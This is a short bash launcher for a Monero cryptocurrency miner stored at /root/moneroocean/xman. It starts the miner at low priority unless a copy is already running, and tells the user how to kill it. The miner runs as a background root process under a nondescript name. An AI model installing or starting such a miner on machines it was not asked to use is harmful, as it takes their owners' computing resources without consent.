#!/bin/bash
if ! pidof xman >/dev/null; then
  nice /root/moneroocean/xman $*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall xman\" or \"sudo killall xman\" if you want to remove background miner first."
fi
